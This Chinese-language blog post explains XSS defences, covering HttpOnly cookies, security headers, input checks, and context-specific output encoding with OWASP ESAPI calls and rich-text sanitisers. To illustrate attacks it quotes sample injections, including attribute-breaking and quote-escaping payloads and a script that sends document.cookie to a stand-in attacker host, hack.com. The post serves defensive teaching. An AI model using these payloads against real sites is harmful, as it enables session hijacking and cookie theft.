首先我们要明确的一点是：没有绝对安全的系统



因此我们所有的防御都有被绕过的可能性



但是，我们在正确的场景选择正确的防御方式显得尤为重要



## 从浏览器的角度来说

我们设置的CSP同源策略之前我的博客有写到



httponly标准：

客户端首先访问页面这是没有cookie的，但是如果客户端提交请求给服务端

服务端这时会生成一个Set-cookie来给客户端，向客户端浏览器写入cookie值



httponly在set-cookie的地方被标记，标记后页面将禁止JS访问带有httponly属性的cookie



之前我有在博客提到的一些HTTP请求头

例如：chrome浏览器的X-XSS-Protection

X-Frame-Options

X-Content-Type-Options



## 输入检查

白名单呀（思考遇到富文本怎么办？）

记得输入检查时应该放在服务端代码实现，如果在客户端JS中形同虚设

网上开源的XSS-Filter，需要对不通的场景进行一个区分

否则会达到显示一些不希望显示的结果





## 输出检查

参考：http://www.voidcn.com/article/p-kihidxxs-bhx.html

如果结果不是输出在富文本中而是输出在html页面的话



那么最实用的编码就是HTMLEncode编码了



在这种编码中转换



    &-->&
    <--><
    >-->>
    "-->"
    '-->'
    /-->/





如果输出的结果是在JS代码中那么应该使用javascriptencode



二者的区别就是 javascriptencode需要对/ 进行一个转义

并且输出变量必须在引号内部防止逃逸



有开源代码更加严格的javascriptencode



### 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码

    <div>$var</div>
    <a href=#> $var </a>



 [编码规则]

那么HTML Entity编码具体应该做哪些事情呢？它需要对下面这6个特殊字符进行编码：


```
&     –>     &amp;
<     –>     &lt;
>     –>     &gt;
”     –>     &quot;
‘     –>     '
/     –>     /

```
有两点需要特别说明的是:

 - 不推荐将单引号( ‘ )编码为 &apos; 因为它并不是标准的HTML标签
 - 需要对斜杠号( / )编码，因为在进行XSS攻击时，斜杠号对于关闭当前HTML标签非常有用


推荐使用OWASP提供的ESAPI函数库，它提供了一系列非常严格的用于进行各种安全编码的函数。在当前这个例子里，你可以使用:

```
String encodedContent = ESAPI.encoder().encodeForHTML(request.getParameter(“input”));

```

### 将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码

    <div id="abc" name="$var"></div>

同样需要" 来闭合所以 HTMLEncode

[编码规则]

除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）

之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。请看下面这个攻击：

假设HTML代码是这样的：

```
< div width=$INPUT> …content… </ div >
攻击者可以构造这样的输入：


x onmouseover=”javascript:alert(/xss/)”
最后，在用户的浏览器里的最终HTML代码会变成这个样子：


<div width=x onmouseover=”javascript:alert(/xss/)”> …content… </div>

```
只要用户的鼠标移动到这个DIV上，就会触发攻击者写好的攻击脚本。在这个例子里，脚本仅仅弹出一个警告框，除了恶作剧一下也没有太多的危害，但是在真实的攻击中，攻击者会使用更加具有破坏力的脚本，例如下面这个窃取用户cookie的XSS攻击：

```
x /> <script>var img = document.createElement(“img”);img.src = ”http://hack.com/xss.js?” + escape(document.cookie);document.body.appendChild(img);</script> <div
除了空格符可以闭合当前属性外，这些符号也可以：


%     *     +     ,     –     /     ;     <     =     >     ^     |     `(反单引号，IE会认为它是单引号)
可以使用ESAPI提供的函数进行HTML属性编码：


String encodedContent = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(“input”));
```

### 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码

保障变量在引号内

    <script>
    var x = "$var"
    </script>



使用javascriptencode编码

这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload等）。在往JavaScript代码里插入数据的时候，只有一种情况是安全的，那就是对不可信数据进行JavaScript编码，并且只把这些数据放到使用引号包围起来的值部分（data value）之中，例如：

```
<script>
     var message = “<%= encodeJavaScript(@INPUT) %>”;
</script>

```
除此之外，往JavaScript代码里其他任何地方插入不可信数据都是相当危险的，攻击者可以很容易地插入攻击代码。

```
<script>alert(‘…插入不可信数据前，进行JavaScript编码…’)</script>值部分使用了单引号
<script>x = “…插入不可信数据前，进行JavaScript编码…”</script>
值部分使用了双引号
<div onmouseover=”x=’…插入不可信数据前，进行JavaScript编码…’ “</div>
值部分使用了引号，且事件处理属性的值部分也使用了引号
特别需要注意的是，在XSS防御中，有些JavaScript函数是极度危险的，就算对不可信数据进行JavaScript编码，也依然会产生XSS漏洞，例如：
<script>
window.setInterval(‘…就算对不可信数据进行了JavaScript编码，这里依然会有XSS漏洞…’);
</script>
```

[编码规则]

除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）

在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。例如：

假设代码片段如下：

```
<script>
var message = ” $VAR “;
</script>
攻击者输入的内容为：

\”; alert(‘xss’);//
如果只是对双引号进行简单转义，将其替换成 \” 的话，攻击者输入的内容在最终的页面上会变成：


<script>
var message = ” \\”; alert(‘xss’);// “;
</script>

```
浏览器在解析的时候，会认为反斜杠后面的那个双引号和第一个双引号相匹配，继而认为后续的alert(‘xss’)是正常的JavaScript脚本，因此允许执行。

可以使用ESAPI提供的函数进行JavaScript编码：

```
String encodedContent = ESAPI.encoder().encodeForJavaScript(request.getParameter(“input”));
```


### 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码

当需要往Stylesheet，Style标签或者Style属性里插入不可信数据的时候，需要对这些数据进行CSS编码。传统印象里CSS不过是负责页面样式的，但是实际上它比我们想象的要强大许多，而且还可以用来进行各种攻击。因此，不要对CSS里存放不可信数据掉以轻心，应该只允许把不可信数据放入到CSS属性的值部分，并进行适当的编码。除此以外，最好不要把不可信数据放到一些复杂属性里，比如url, behavior等，只能被IE认识的Expression属性允许执行JavaScript脚本，因此也不推荐把不可信数据放到这里。

```
<style>selector { property : …插入不可信数据前，进行CSS编码…} </style><style>selector { property : ” …插入不可信数据前，进行CSS编码… “} </style>
<span style=” property : …插入不可信数据前，进行CSS编码… ”> … </span>
```
[编码规则]

除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）

同原则2，原则3，在对不可信数据进行编码的时候，切忌投机取巧对双引号等特殊字符进行简单转义，攻击者可以想办法绕开这类限制。

可以使用ESAPI提供的函数进行CSS编码：

```
String encodedContent = ESAPI.encoder().encodeForCSS(request.getParameter(“input”));
```

### 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码

当需要往HTML页面中的URL里插入不可信数据的时候，需要对其进行URL编码，如下：

```
<a href=”http://www.abcd.com?param=…插入不可信数据前，进行URL编码…”> Link Content </a>
```
[编码规则]

除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）

在对URL进行编码的时候，有两点是需要特别注意的：

1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码
2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。

可以使用ESAPI提供的函数进行URL编码：

```
String encodedContent = ESAPI.encoder().encodeForURL(request.getParameter(“input”));
```
ESAPI还提供了一些用于检测不可信数据的函数，在这里我们可以使用其来检测不可信数据是否真的是一个URL：

```
String userProvidedURL = request.getParameter(“userProvidedURL”);boolean isValidURL = ESAPI.validator().isValidInput(“URLContext”, userProvidedURL, “URL”, 255, false);
if (isValidURL) {
<a href=”<%= encoder.encodeForHTMLAttribute(userProvidedURL) %>”></a>
}
```

### 使用富文本时，使用XSS规则引擎进行编码过滤

Web应用一般都会提供用户输入富文本信息的功能，比如BBS发帖，写博客文章等，用户提交的富文本信息里往往包含了HTML标签，甚至是JavaScript脚本，如果不对其进行适当的编码过滤的话，则会形成XSS漏洞。但我们又不能因为害怕产生XSS漏洞，所以就不允许用户输入富文本，这样对用户体验伤害很大。

针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如<b>, <i>, <p>等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在<div>, <p>等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到<SCRIPT>标签里。

推荐XSS规则过滤引擎：OWASP AntiSamp或者Java HTML Sanitizer



![](http://132.232.32.24/wp-content/uploads/2019/05/1557202314722.png)

